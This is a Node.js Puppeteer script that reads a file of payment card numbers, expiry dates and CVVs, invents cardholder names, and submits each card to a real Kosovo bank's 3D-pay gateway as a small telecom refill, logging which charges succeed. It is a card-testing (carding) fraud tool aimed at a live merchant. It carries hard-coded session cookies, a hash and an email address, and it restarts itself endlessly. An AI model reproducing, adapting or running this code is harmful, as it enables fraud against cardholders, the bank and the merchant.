const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs').promises;
const chalk = require('chalk');
const faker = require('faker');

const initialUrl = 'https://ecommerce.teb-kos.com/fim/est3Dgate';
const txtFilePath = 'yourFileName.txt';

const headers = {
  'Host': 'ecommerce.teb-kos.com',
  'Cookie': 'JSESSIONID=4E669F5A5597EB632764CFE13DB923AF; dbb14a5a12d32eea605adf7c930cce6b=288ea46d353b7e6453f8a6f7641b2a3f; TS012c10c7=01523dde664b05044b8f6e251a7c6bcbb46ef69946ab4d6aad6602884987f649f5c41c98001cd08269de5b1ed79512d613448cf78979ca6f6f788f678590d52c74e337bc4618823393af9176c1600d86aafd572303',
  'Content-Type': 'application/x-www-form-urlencoded',
  'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Referer': 'https://shop.ipko.com/',
  'Accept-Encoding': 'gzip, deflate, br',
  'Accept-Language': 'en-US,en;q=0.9',
  'Connection': 'close'
};

const data = {
  'clientid': '290000010',
  'storetype': '3D_PAY_HOSTING',
  'amount': '5.00',
  'okUrl': 'https://shop.ipko.com/Processor/MessageParser/Success',
  'failUrl': 'https://shop.ipko.com/Processor/MessageParser/Failed',
  'TranType': 'Auth',
  'currency': '978',
  'rnd': '0.25127000 1704596960',
  'shopurl': 'https://shop.ipko.com/',
  'hashAlgorithm': 'ver3',
  'installmentonHPP': 'YES',
  'lang': 'sq',
  'refreshtime': '3',
  'BillToName': '',
  'BillToCompany': '',
  'BillToStreet1': '',
  'BillToCity': '',
  'BillToStateProv': '',
  'BillToPostalCode': '',
  'BillToCountry': '',
  'email': 'merkarare@gmail.com',
  'tel': '5b94a83c2a5fb249ccd325d8cb2427f8',
  'description': 'GSM Refill - [ 38348437143 ]',
  'encoding': 'UTF-8',
  'Fismi': 'ecommerce',
  'SESSIONTIMEOUT': '360',
  'HASH': 'hL3fGCSVoKjra068qJ7nMeDo9JUuIypZLMWAMMg0jjemiev161HGdc7q+JQSlTpYysRhJCz/t8j2g9HO/xxcfg=='
};

const runScript = async () => {
  let browser;
  let page;

  try {
    // Read credit card details from the TXT file
    const creditCards = (await fs.readFile(txtFilePath, 'utf-8')).trim().split('\n').map(line => line.split('|'));

    // Open a browser with Puppeteer and specify the remote debugging port
    browser = await puppeteer.launch({ headless: true });
    page = await browser.newPage();

    // Keep the script running until no more credit cards are available
    while (creditCards.length > 0) {
      const currentCardDetails = creditCards.shift(); // Take the first card from the list

      // Set the cardholder name using Faker
      const cardholderName = faker.name.findName();

      // Update the credit card details array with the generated name
      currentCardDetails[4] = cardholderName;

      // Send POST request using axios
      const response = await axios.post(initialUrl, data, { headers });

      // Navigate to the initial URL
      await page.goto(initialUrl);

      // Inject and submit a form with the response HTML content
      await page.evaluate((htmlContent) => {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://ecommerce.teb-kos.com/fim/est3Dgate'; // Set the correct action URL
        form.innerHTML = htmlContent;
        document.body.appendChild(form);
        form.submit();
      }, response.data)

      // Wait for the page to redirect after form submission
      await page.waitForNavigation();

      // Log the credit card details
      console.log('Credit Card Number:', currentCardDetails[0]);
      console.log('Expiration Month:', currentCardDetails[1]);
      console.log('Expiration Year:', currentCardDetails[2]);
      console.log('CVV:', currentCardDetails[3]);
      console.log('Cardholder Name:', currentCardDetails[4]);

      // Wait for 1 second
      await page.waitForTimeout(1000);

      // Fill the credit card details on the web page
      await page.type('input#cardnumber', currentCardDetails[0]);
      await page.type('input#date', `${currentCardDetails[1]}/${currentCardDetails[2]}`);
      await page.type('input#CVV2', currentCardDetails[3]);
      await page.type('input#carholder-name', currentCardDetails[4]);

      // Wait for 1 second
      await page.waitForTimeout(1000);

      // Click on the "Vazhdo" button
      await page.click('a.btn-finish');

      // Wait for the page to redirect after clicking "Vazhdo"
      await page.waitForNavigation({ timeout: 5000 }).catch(() => {});

      // Wait for the page to redirect after clicking "PÃÂÃÂ«rfundo"
      await page.waitForSelector('a.btn-finish[href="javascript:onSubmit()"]', { timeout: 5000 }).catch(() => {});

      // Click on the "PÃÂÃÂ«rfundo" button
      await page.click('a.btn-finish[href="javascript:onSubmit()"]');

      // Wait for the page to redirect after clicking "PÃÂÃÂ«rfundo"
      const startTime = Date.now();
      let isRedirected = false;

      while (Date.now() - startTime < 30000) {
        const currentUrl = page.url();

        if (
          currentUrl === 'https://shop.ipko.com/Processor/MessageParser/Success' ||
          currentUrl === 'https://shop.ipko.com/Processor/MessageParser/Failed'
        ) {
          isRedirected = true;
          break;
        }

        // Wait for a short interval before checking again
        await page.waitForTimeout(200);
      }

      if (!isRedirected) {
        console.log(chalk.yellow('3D Secure page detected\n'));
        // Additional handling for 3D Secure if needed
      } else {
        // Get the current URL after redirection
        const currentUrl = page.url();

        if (currentUrl === 'https://shop.ipko.com/Processor/MessageParser/Success') {
          console.log(chalk.green('Transaction Completed\n'));
          // Additional handling for success if needed
        } else if (currentUrl === 'https://shop.ipko.com/Processor/MessageParser/Failed') {
          // Extract and log the failure reason using XPath
          const failureReason = await page.evaluate(() => {
            const xpath = "/html/body/div[1]/div/div[1]/div[1]/div/div[3]/p"; // Example XPath
            const failureElement = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            return failureElement ? failureElement.textContent.trim() : 'Reason not available';
          });
          console.log(chalk.red(`Transaction Not Completed -- Failure Reason: ${failureReason}\n`));

          // Additional handling for failure if needed
        } else {
          console.log(chalk.red('Unexpected URL after transaction:', currentUrl));
        }

        // Open the success or failed link in a new tab/window (you can modify this based on your requirement)
        const resultPage = await browser.newPage();
        await resultPage.goto(currentUrl);
        await resultPage.waitForTimeout(2000); // Adjust the wait time if needed
        await resultPage.close(); // Close the result page
      }

      // Wait for 1 second before processing the next credit card
      await page.waitForTimeout(1000);
    }
  } catch (error) {
    console.error('An error occurred:', error.message);
  } finally {
    // Close the browser when done
    if (browser) {
      await browser.close();
    }
    // Continue running the script
    runScript();
  }
};

// Run the script
runScript();
